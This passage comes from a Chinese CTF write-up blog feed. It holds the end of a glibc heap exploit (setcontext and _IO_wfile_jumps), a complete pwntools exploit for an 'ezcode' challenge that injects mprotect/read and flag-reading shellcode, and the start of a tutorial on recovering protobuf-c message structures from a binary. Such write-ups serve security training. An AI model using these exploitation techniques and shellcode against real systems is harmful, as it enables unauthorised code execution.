operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x550</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x550</span> <span class="token operator">+</span> <span class="token number">0x530</span> <span class="token operator">+</span> <span class="token number">0x290</span>setcontext <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">61</span>target_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x550</span> <span class="token operator">+</span> <span class="token number">0x530</span> <span class="token operator">+</span> <span class="token number">0x290</span>p2 <span class="token operator">=</span> <span class="token string">b'\x00'</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_wfile_jumps<span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target_addr <span class="token operator">+</span> <span class="token number">0xe0</span> <span class="token operator">+</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0xe8</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezcode"><a href="#ezcode" class="headerlink" title="ezcode"></a>ezcode</h2><p><code>json</code>构造一次<code>mprotect</code>和<code>read</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> jsoncontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-ff73d874f7.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov ax, 10shl edi, 12mov dx, 0x7syscall'''</span>shellcode <span class="token operator">=</span> <span class="token string">b'66 b8 0a 00 c1 e7 0c 66 ba 07 00 0f 05'</span><span class="token triple-quoted-string string">'''cdqmov esi, edixor eax, eaxxor edi, edisyscall'''</span>shellcode <span class="token operator">+=</span> <span class="token string">b'99 89 fe 31 c0 31 ff 0f 05 '</span>shellcode <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b" "</span><span class="token punctuation">,</span> <span class="token string">b""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>li<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"shellcode"</span><span class="token punctuation">:</span> shellcode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>json_string <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'input'</span><span class="token punctuation">,</span> json_string<span class="token punctuation">)</span>shellcode_orw <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall'''</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'\x90'</span><span class="token operator">*</span><span class="token number">0xff</span><span class="token operator">+</span>asm<span class="token punctuation">(</span><span class="token string">"shl rsp, 12; add rsp, 0x500;"</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcode_orw<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目：&lt;a href=&quot;https://github.com/0xviol1t/CTF-challenges/tree/main/2024/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/pwn&quot;&gt;https://github.com/0xviol</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>只能接受特定格式的msgbot-protobuf+可见字符shellcode</title>
    <link href="https://starrysky1004.github.io/2024/10/13/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/"/>
    <id>https://starrysky1004.github.io/2024/10/13/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/</id>
    <published>2024-10-13T07:37:04.000Z</published>
    <updated>2024-10-13T09:52:53.092Z</updated>
    
    <content type="html"><![CDATA[<p>本题来源于源鲁杯第一轮<code>pwn</code>的困难题，向程序发送了<code>msg</code>之后会判定是否符合<code>proto</code>结构，符合则开启沙箱仅允许执行<code>read、write、fstat、alarm、exit_group</code>，并执行<code>msg</code>里的<code>shellcode</code>，<code>shellcode</code>要求范围在可见字符且长度不大于<code>0xc7</code></p><h2 id="protobuf结构体"><a href="#protobuf结构体" class="headerlink" title="protobuf结构体"></a>protobuf结构体</h2><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="protobuf结构体-x2F-proto文件示例"><a href="#protobuf结构体-x2F-proto文件示例" class="headerlink" title="protobuf结构体&#x2F;proto文件示例"></a>protobuf结构体&#x2F;proto文件示例</h4><p><code>protobuf</code>结构体示例：<code>device.proto</code>，由<code>protobuf</code>版本（<code>proto2 / proto3</code>）和<code>protobuf</code>结构体构成</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto2"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">devicemsg</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">required</span> <span class="token builtin">sint64</span> actionid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">required</span> <span class="token builtin">sint64</span> msgidx <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">required</span> <span class="token builtin">sint64</span> msgsize <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">required</span> <span class="token builtin">bytes</span>  msgcontent <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="protobuf参数的结构体定义"><a href="#protobuf参数的结构体定义" class="headerlink" title="protobuf参数的结构体定义"></a>protobuf参数的结构体定义</h4><p><code>protobuf</code>参数的结构体定义如下，其中需要注意的是前四项，在<code>.data.rel.ro</code>段中可以看到每个参数的结构体，根据结构体中的值判断参数类型等信息，从而分析得到<code>protobuf</code>结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">ProtobufCFieldDescriptor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token class-name">uint32_t</span>id<span class="token punctuation">;</span>ProtobufCLabel  label<span class="token punctuation">;</span>ProtobufCTypetype<span class="token punctuation">;</span><span class="token keyword">unsigned</span>quantifier_offset<span class="token punctuation">;</span><span class="token keyword">unsigned</span>offset<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span>descriptor<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span>default_value<span class="token punctuation">;</span><span class="token class-name">uint32_t</span>flags<span class="token punctuation">;</span><span class="token keyword">unsigned</span>reserved_flags<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span>reserved2<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span>reserved3<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以示例中的<code>required sint64 actionid = 1;</code>为例，分别对应结构体前四项：<code>name</code>值为<code>actionid</code>，<code>id</code>值为<code>1</code>，<code>label</code>值为<code>required</code>，<code>type</code>值为<code>sint64</code>，<strong>即在编写<code>proto</code>文件时是按照<code>label type name = id</code>的顺序写的</strong></p><p><code>label</code>存在以下类型，即<code>required</code>、<code>optional</code>、<code>repeated</code>、<code>none</code>，从单词含义也能看出对应什么类型，他们表现在<code>.data.rel.ro</code>中的数值是按枚举顺序<code>0-3</code>，**只有版本为<code>proto2</code>时才需要考虑<code>label</code>**，<code>proto3</code>的<code>label</code>都是<code>none</code>（即数值为<code>3</code>）且不需要在<code>proto</code>文件中写出来</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>PROTOBUF_C_LABEL_REQUIRED<span class="token punctuation">,</span>PROTOBUF_C_LABEL_OPTIONAL<span class="token punctuation">,</span>PROTOBUF_C_LABEL_REPEATED<span class="token punctuation">,</span>PROTOBUF_C_LABEL_NONE<span class="token punctuation">,</span><span class="token punctuation">&#125;</span> ProtobufCLabel<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>type</code>存在以下类型，他们表现在<code>.data.rel.ro</code>中的数值是按枚举顺序<code>0-0x10</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>PROTOBUF_C_TYPE_INT32<span class="token punctuation">,</span>      <span class="token comment">/**&lt; int32 */</span>PROTOBUF_C_TYPE_SINT32<span class="token punctuation">,</span>     <span class="token comment">/**&lt; signed int32 */</span>PROTOBUF_C_TYPE_SFIXED32<span class="token punctuation">,</span>   <span class="token comment">/**&lt; signed int32 (4 bytes) */</span>PROTOBUF_C_TYPE_INT64<span class="token punctuation">,</span>      <span class="token comment">/**&lt; int64 */</span>PROTOBUF_C_TYPE_SINT64<span class="token punctuation">,</span>     <span class="token comment">/**&lt; signed int64 */</span>PROTOBUF_C_TYPE_SFIXED64<span class="token punctuation">,</span>   <span class="token comment">/**&lt; signed int64 (8 bytes) */</span>PROTOBUF_C_TYPE_UINT32<span class="token punctuation">,</span>     <span class="token comment">/**&lt; unsigned int32 */</span>PROTOBUF_C_TYPE_FIXED32<span class="token punctuation">,</span>    <span class="token comment">/**&lt; unsigned int32 (4 bytes) */</span>PROTOBUF_C_TYPE_UINT64<span class="token punctuation">,</span>     <span class="token comment">/**&lt; unsigned int64 */</span>PROTOBUF_C_TYPE_FIXED64<span class="token punctuation">,</span>    <span class="token comment">/**&lt; unsigned int64 (8 bytes) */</span>PROTOBUF_C_TYPE_FLOAT<span class="token punctuation">,</span>      <span class="token comment">/**&lt; float */</span>PROTOBUF_C_TYPE_DOUBLE<span class="token punctuation">,</span>     <span class="token comment">/**&lt; double */</span>PROTOBUF_C_TYPE_BOOL<span class="token punctuation">,</span>       <span class="token comment">/**&lt; boolean */</span>PROTOBUF_C_TYPE_ENUM<span class="token punctuation">,</span>       <span class="token comment">/**&lt; enumerated type */</span>PROTOBUF_C_TYPE_STRING<span class="token punctuation">,</span>     <span class="token comment">/**&lt; UTF-8 or ASCII string */</span>PROTOBUF_C_TYPE_BYTES<span class="token punctuation">,</span>      <span class="token comment">/**&lt; arbitrary byte sequence */</span>PROTOBUF_C_TYPE_MESSAGE<span class="token punctuation">,</span>    <span class="token comment">/**&lt; nested message */</span><span class="token punctuation">&#125;</span> ProtobufCType<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判定protobuf版本"><a href="#判定protobuf版本" class="headerlink" title="判定protobuf版本"></a>判定protobuf版本</h4><ul><li><p>根据结构体参数数量和实际数量是否一致判断</p><p>在<code>.data.rel.ro</code>段的结构体名下面两项分别是结构体大小和结构体参数数量，<code>proto2</code>比<code>proto3</code>多了<code>default_value</code>字段，所以参数数量会比实际参数数量多一个</p></li><li><p>根据参数结构体有无<code>label</code></p><p><code>proto2</code>中必须声明参数的<code>label</code>，所以<code>label</code>值存在除<code>none</code>（即<code>3</code>）以外的值就是<code>proto2</code></p></li></ul><h4 id="编译proto文件"><a href="#编译proto文件" class="headerlink" title="编译proto文件"></a>编译proto文件</h4><p>使用<code>python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. filename.proto</code>来编译<code>filename.proto</code>，需要先安装<code>grpcio-tools</code>，编译后得到<code>filename_pb2.py</code>和<code>filename_pb2_grpc.py</code>，编译后在<code>exp</code>中导入<code>filename_pb2</code>即可使用结构体来发送消息</p><p>编译后的结构体会比原结构体多<code>ProtobufCMessage base;</code>，<code>ProtobufCMessage</code>结构体定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">ProtobufCMessage</span> <span class="token punctuation">&#123;</span><span class="token keyword">const</span> ProtobufCMessageDescriptor<span class="token operator">*</span>descriptor<span class="token punctuation">;</span><span class="token keyword">unsigned</span>n_unknown_fields<span class="token punctuation">;</span>ProtobufCMessageUnknownField<span class="token operator">*</span>unknown_fields<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>所以编译后我们定义的参数在数组中的下标是从<code>3</code>开始的</strong></p><h4 id="使用pbtk获取protobuf结构体"><a href="#使用pbtk获取protobuf结构体" class="headerlink" title="使用pbtk获取protobuf结构体"></a>使用pbtk获取protobuf结构体</h4><p>工具地址：<a href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p><p>使用工具可以快速获取<code>protobuf</code>结构体省去手搓<code>proto</code>文件的麻烦，安装的时候有报错可以直接问<code>gpt</code>解决，但是有的题目被作者刻意隐藏了<code>protobuf</code>特征而无法用工具梭，还是需要手搓</p><h3 id="结构体分析"><a href="#结构体分析" class="headerlink" title="结构体分析"></a>结构体分析</h3><p>在<code>IDA</code>中找到了<code>_data_rel_ro</code>段，<code>name</code>在<code>;</code>右边，下面第一个数值为<code>id</code>，<code>2-5</code>是<code>label</code>，<code>6-9</code>是<code>type</code>，对应枚举中的类型可以得到结构体参数的类型，这里一共有<code>msgid</code>、<code>msgsize</code>、<code>msgcontent</code>三个参数，而<code>qword_3C60</code>结构体名称下面的结构体参数数量也是<code>3</code>，所以<code>protobuf</code>版本为<code>proto3</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80 _data_rel_ro    segment align_32 public <span class="token char">'DATA'</span> use64<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80                 assume cs<span class="token operator">:</span>_data_rel_ro<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80                 <span class="token punctuation">;</span>org <span class="token number">3</span>B80h<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80 off_3B80        dq offset aMsgid        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C98↓o<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80                                         <span class="token punctuation">;</span> <span class="token string">"msgid"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B88                 db    <span class="token number">1</span>#id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B89                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8A                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8B                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8C                 db    <span class="token number">3</span>#label<span class="token operator">=</span>none<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8D                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8E                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8F                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B90                 db    <span class="token number">3</span>#type<span class="token operator">=</span>int64<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BC8                 dq offset aMsgsize      <span class="token punctuation">;</span> <span class="token string">"msgsize"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD0                 db    <span class="token number">2</span>#id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD1                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD2                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD3                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD4                 db    <span class="token number">3</span>#label<span class="token operator">=</span>none<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD5                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD6                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD7                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD8                 db    <span class="token number">3</span>#type<span class="token operator">=</span>int64<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C10                 dq offset aMsgcontent   <span class="token punctuation">;</span> <span class="token string">"msgcontent"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C18                 db    <span class="token number">3</span>#id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C19                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1A                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1B                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1C                 db    <span class="token number">3</span>#label<span class="token operator">=</span>none<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1D                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1E                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1F                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C20                 db  <span class="token number">0F</span>h#type<span class="token operator">=</span>bytes<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C60 qword_3C60      dq <span class="token number">28</span>AAEEF9h            <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> sub_1819<span class="token operator">+</span><span class="token number">10</span>↑o<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C60                                         <span class="token punctuation">;</span> sub_187D<span class="token operator">+</span><span class="token number">17</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C68                 dq offset aBotMsgbot    <span class="token punctuation">;</span> <span class="token string">"bot.msgbot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C70                 dq offset aMsgbot       <span class="token punctuation">;</span> <span class="token string">"Msgbot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C78                 dq offset aBotMsgbot_0  <span class="token punctuation">;</span> <span class="token 